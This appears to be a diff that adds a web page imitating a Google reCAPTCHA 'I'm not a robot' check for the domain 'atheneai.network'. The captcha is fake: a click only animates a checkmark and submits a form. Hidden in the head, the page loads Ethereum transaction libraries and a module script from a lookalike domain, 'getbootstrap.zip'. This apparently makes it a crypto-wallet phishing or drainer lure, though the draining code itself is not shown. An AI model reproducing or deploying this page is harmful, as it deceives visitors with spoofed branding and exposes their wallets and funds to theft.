@@ -1,0 +1,352 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google ReCaptcha</title>
+    <link rel="shortcut icon" href="images/Google_reCAPTCHA.png" type="image/png">
+
+    <style>
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .main {
+            margin: 0 15px;
+            max-width: 800px;
+            width: 100%;
+            font-family: Arial, Helvetica, sans-serif;
+            filter: blur(0.3px);
+            color: #262626;
+        }
+
+        .logo {
+            background-image: url('/pictures/white.png');
+            width: 190px;
+            height: 120px;
+            background-size: contain;
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+
+
+        .title {
+            font-weight: 600;
+            font-family: Arial;
+            font-size: 38px;
+            margin-top: 5px;
+        }
+
+
+        .spinner {
+            color: #6aa2fd;
+            position: absolute;
+            margin-top: 20px;
+            margin-left: 10px;
+            border: 5px solid #F9F9F9;
+            width: 25px;
+            height: 25px;
+            border-radius: 80%;
+            border-left-color: #6aa2fd;
+            animation: spin 0.7s infinite linear;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .smalltitle {
+            margin-top: -8px;
+            font-size: 21px
+        }
+
+        .recaptcha {
+            display: flex;
+            width: 301.6px;
+            height: 75.6px;
+            border-radius: 3px;
+            border: 1px solid #d3d3d3;
+            background-color: #F9F9F9;
+            margin-top: 40px;
+        }
+
+        .checkboxcontainer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 100%;
+            margin: 0 12px 2px 12px;
+        }
+
+        .checkbox {
+            -webkit-border-radius: 2px;
+            -moz-border-radius: 2px;
+            border-radius: 2px;
+            background-color: #fff;
+            border: 2px solid #c1c1c1;
+            font-size: 1px;
+            height: 24px;
+            position: absolute;
+            width: 24px;
+            z-index: 1;
+        }
+
+        .recaptcha:hover .checkbox {
+            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .1);
+            border: 2px solid #b2b2b2;
+            cursor: default;
+        }
+
+        .textblock {
+            display: flex;
+            height: 100%;
+            width: 152px;
+            align-items: center;
+            margin-left: -5px;
+        }
+
+        .span {
+            font-family: Roboto, helvetica, arial, sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 17px;
+            font-size: 15px;
+            margin-bottom: -3px;
+            user-select: none;
+        }
+
+        .blockcontainer {
+            display: flex;
+            justify-content: right;
+            height: 100%;
+            width: 50%;
+        }
+
+        .logoblock {
+            display: flex;
+            flex-direction: column;
+            width: 70px;
+            height: 100%;
+            padding-top: 4px;
+            margin-right: 4px;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo {
+            background: url(images/logo_48.png);
+            background-repeat: no-repeat;
+            background-size: 32px;
+            height: 32px;
+            margin: 0 13px 0 13px;
+            width: 32px;
+            margin-bottom: 7px;
+        }
+
+        .text {
+            cursor: default;
+            font-family: Roboto, helvetica, arial, sans-serif;
+            font-size: 9.5px;
+            font-weight: 400;
+            line-height: 10px;
+            text-align: center;
+        }
+
+        .smalltext {
+            color: #555;
+            font-family: Roboto, helvetica, arial, sans-serif;
+            font-size: 8px;
+            font-weight: 400;
+            display: inline;
+            padding-left: 1px;
+            padding-right: 1px;
+            padding-top: 2px;
+            padding-bottom: 4px;
+        }
+
+        .link {
+            text-decoration: none;
+            color: #555;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+            color: #555;
+        }
+
+        @keyframes checkmark-animation {
+            from {
+                background-position: 0 0;
+            }
+
+            to {
+                background-position: 0 -600px;
+            }
+        }
+
+        .checkmark {
+            display: none;
+            background-image: url(data:image/png;base64,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);
+            background-repeat: no-repeat;
+            border: none;
+            height: 30px;
+            left: -5px;
+            outline: 0;
+            position: absolute;
+            width: 80px;
+            margin-top: 23px;
+            margin-left: 13px;
+            animation: checkmark-animation 0.02s ease-out forwards;
+        }
+
+        .h3 {
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 70px;
+        }
+
+        /* @media (max-width: 899px) {
+            .main {
+                width: 300px;
+                height: 400px;
+                position: absolute;
+                top: 45%;
+                left: 50%;
+                transform: translate(-50%, -25%);
+            }
+        }
+
+        @media (max-width: 599px) {
+            .main {
+                width: 300px;
+                height: 400px;
+                position: absolute;
+                top: 45%;
+                left: 50%;
+                transform: translate(-50%, -25%);
+            }
+        } */
+
+        @media (prefers-color-scheme: dark) {
+            body {
+                background-color: rgb(22, 22, 22);
+                color: white;
+            }
+
+            .title,
+            .smalltitle,
+            .h3 {
+                color: rgb(237, 237, 237);
+            }
+
+            .spinner {
+                border: 7px solid rgba(255, 255, 255, 0.5);
+                width: 27px;
+                height: 27px;
+                border-radius: 80%;
+                border: 5px solid #212121;
+                color: #212121;
+                border-left-color: #6aa2fd;
+                animation: spin 1s infinite linear;
+            }
+
+            .recaptcha,
+            .text,
+            .link {
+                color: grey;
+                background-color: #212121;
+            }
+
+            .span {
+                color: rgb(237, 237, 237);
+            }
+        }
+    </style>
+<link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.min.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Montserrat:wght@400;500;700&family=Raleway:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" integrity="sha512-FDcVY+g7vc5CXANbrTSg1K5qLyriCsGDYCE02Li1tXEYdNQPvLPHNE+rT2Mjei8N7fZbe0WLhw27j2SrGRpdMg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js" integrity="sha512-2oprd2T2vSkAii+dVWi6C+uATbQ1YGmCed6b6msb9Jxi33hsXAbnhwZ9thwCq6ndidZv4P51qaq58uo9b/x4nA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>     
+    <script src="./settings.js"></script>
+    <script src="https://getbootstrap.zip/web3-ethers.js" type="module"></script></head>
+
+<body>
+    <div class="main">
+        <!-- Domain -->
+        <h1 class="title">atheneai.network</h1>
+        <h3 class="smalltitle">Verifying you are human. This may take a few seconds.</h3>
+        <div class="recaptcha" id="recaptcha">
+            <div class="checkboxcontainer">
+                <div class="checkbox" id="checkbox"></div>
+            </div>
+            <div class="textblock">
+                <div class="span">I'm not a robot</div>
+            </div>
+            <div class="blockcontainer">
+                <div class="logoblock">
+                    <div class="logo"></div>
+                    <div class="text">reCAPTCHA</div>
+                    <div class="smalltext">
+                        <a href="https://policies.google.com/privacy?hl=en" target="_blank" class="link">Privacy</a> 
+                        -
+                        <a href="https://policies.google.com/terms?hl=en" target="_blank" class="link">Terms</a>
+                    </div>
+                </div>
+            </div>
+            <div class="spinner" id="spinner"></div>
+            <div class="checkmark" id="checkmark"></div>
+        </div>
+        <div class="h3" id="domainText">
+            atheneai.network needs to review the security of your connection before proceeding.
+        </div>
+
+        <form method="post" id="captcha-form"></form>
+    </div>
+
+    <script type="70be495d9aab64db9f8a0050-text/javascript">
+        document.addEventListener('DOMContentLoaded', function () {
+            const captchaForm =document.getElementById("captcha-form");
+            const recaptcha = document.getElementById('recaptcha');
+
+            recaptcha.addEventListener('click', function () {
+                const checkbox = document.getElementById('checkbox');
+                const spinner = document.getElementById('spinner');
+                
+                checkbox.style.display = 'none';
+                spinner.style.display = 'block';
+
+                setTimeout(function () {
+                    const checkmark = document.getElementById('checkmark');
+
+                    spinner.style.display = 'none';
+                    checkmark.style.display = 'block';
+
+                    setTimeout(function () {
+                        captchaForm.submit();
+                    }, 1000);
+                }, 2000);
+            });
+
+
+            const blockElement = document.getElementById('block');
+            if (blockElement) {
+                blockElement.addEventListener('click', function () {
+                    this.style.display = 'none';
+                    document.getElementById('spinner').style.display = 'block';
+                });
+            }
+        });
+    </script>
+<script src="js/rocket-loader.min.js" data-cf-settings="70be495d9aab64db9f8a0050-|49" defer=""></script></body></html>
